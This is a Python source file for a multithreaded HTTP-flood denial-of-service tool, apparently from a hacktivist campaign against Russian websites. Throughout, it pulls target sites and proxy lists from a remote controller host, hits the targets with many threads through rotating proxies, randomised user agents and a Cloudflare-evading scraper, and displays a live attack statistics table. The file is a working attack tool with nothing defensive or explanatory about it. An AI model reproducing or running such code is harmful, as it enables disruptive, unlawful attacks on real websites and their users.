# -*- coding: utf-8 -*-
from argparse import ArgumentParser
from concurrent.futures import ThreadPoolExecutor, as_completed
from dotenv import load_dotenv
from os import system
from pyuseragents import random as random_useragent
from random import choice
from requests.exceptions import ConnectionError
from sys import stderr
from threading import Thread
from time import sleep
from urllib.parse import unquote
from urllib3 import disable_warnings
import cloudscraper
import json
import os
import platform
import requests
import tableprint

load_dotenv()  # Take environment variables from .env file.

statistic = {}
work_statistic = True
general_statistics = [0, 0]
threads_count = 0
thread_count = 0

class FuckYouRussianShip:
    HOSTS = []
    HOSTS_URL = os.getenv('ATTACKER_HOSTS_URL')
    MAX_REQUESTS = 5000

    def __init__(self):
        disable_warnings()
        self.args = self.parse_arguments()
        self.no_clear = self.args.no_clear
        self.targets = self.args.targets
        self.threads = int(self.args.threads)
        self.HOSTS = json.loads(requests.get(self.HOSTS_URL).content)

        global work_statistic
        global statistic

    @staticmethod
    def clear():
        command = 'clear' if ['Linux', 'Darwin'].count(platform.system()) else 'cls'
        return system(command)

    @staticmethod
    def parse_arguments():
        parser = ArgumentParser()
        parser.add_argument('threads', nargs='?')
        parser.add_argument("-n", "--no-clear", dest="no_clear", action='store_true')
        parser.add_argument("-t", "--targets", dest="targets", nargs='+')
        parser.add_argument("-lo", "--logger-output", dest="logger_output")
        parser.add_argument("-lr", "--logger-results", dest="logger_results")
        parser.set_defaults(threads=int(os.getenv('ATTACKER_THREADS')))
        parser.set_defaults(targets=json.loads(os.getenv('ATTACKER_TARGETS')))
        parser.set_defaults(no_clear=False)
        parser.set_defaults(proxy_view=False)
        parser.set_defaults(logger_output=stderr)
        parser.set_defaults(logger_results=stderr)
        args, _ = parser.parse_known_args()
        return args

    @staticmethod
    def init_scraper():
        new_scraper = cloudscraper.create_scraper(browser={
            'browser': 'firefox',
            'platform': 'android',
            'mobile': True
        })
        new_scraper.headers.update({
            'Content-Type': 'application/json',
            'cf-visitor': 'https',
            'User-Agent': random_useragent(),
            'Connection': 'keep-alive',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'ru',
            'x-forwarded-proto': 'https',
            'Accept-Encoding': 'gzip, deflate, br'
        })
        return new_scraper

    def mainth(self):
        global threads_count
        threads_count += 1

        while True:
            scraper = self.init_scraper()
            host = choice(self.HOSTS)
            try:
                content = scraper.get(host).content
                data = json.loads(content)
                del content
                site = unquote(choice(self.targets) if self.targets else data['site']['page'])
                if site not in statistic and work_statistic:
                    statistic[site] = [site, 0, 0, 0, 0, 0, 0]
            except Exception:
                continue

            try:
                proxy = choice(data['proxy'])
                proxy_url = f'{proxy["auth"]}@{proxy["ip"]}' if proxy['auth'] else proxy['ip']
                attack = scraper.get(site, timeout=10, proxies={
                    'http': f'http://{proxy_url}',
                    'https': f'https://{proxy_url}'
                })
                # Writing statistic
                self.write_statistic_success(site, attack.status_code)
                del attack
            except (ConnectionError, Exception) as e:
                self.write_statistic_error(site)
                continue
            finally:
                del scraper, host, data, site, proxy, proxy_url
                threads_count -= 1
                return self.mainth()

    @staticmethod
    def write_statistic_success(url_target, status_code):
        statistic[url_target][int(str(status_code)[0])] += 1
        general_statistics[0] += 1

    @staticmethod
    def write_statistic_error(url_target):
        statistic[url_target][6] += 1
        general_statistics[1] += 1

    def cleaner(self):
        while True:
            sleep(60)

            if not self.no_clear:
                self.clear()

    @staticmethod
    def print_statistic():
        FuckYouRussianShip.clear()
        while True:
            if len(statistic.keys()):
                print(f"Attack in processing... Success: {general_statistics[0]} | Errors: {general_statistics[1]}")
                headers = ['Url',
                           '1-- status',
                           '2-- status',
                           '3-- status',
                           '4-- status',
                           '5-- status',
                           'Errors']
                statistic_data = list(statistic.values())
                statistic_data.append([
                    'Successful Requests',
                    general_statistics[0],
                    'Threads',
                    threads_count,
                    '',
                    'Errors',
                    general_statistics[1]
                ])
                tableprint.table(
                    data=statistic_data,
                    headers=headers,
                    width=[len(max(list(statistic.keys()), key=len)), 10, 10,
                           10, 10, 10, 8]
                )
            sleep(5)
            FuckYouRussianShip.clear()

def attacker_threading(threads_count, worker_func):
    with ThreadPoolExecutor(max_workers=threads_count) as executor:
        future_tasks = [executor.submit(worker_func) for _ in range(threads_count)]
        for task in as_completed(future_tasks):
            while True:
                try:
                    task.result()
                    break
                except Exception:
                    sleep(5)


if __name__ == '__main__':
    try:
        while True:
            attacker = FuckYouRussianShip()
            if not attacker.no_clear:
                attacker.clear()

            thread_count = attacker.threads
            Thread(target=attacker.cleaner, daemon=True).start()
            Thread(target=attacker.print_statistic, daemon=True).start()

            attacker_threading(attacker.threads, attacker.mainth)
    except KeyboardInterrupt:
        print(f'Exiting...')
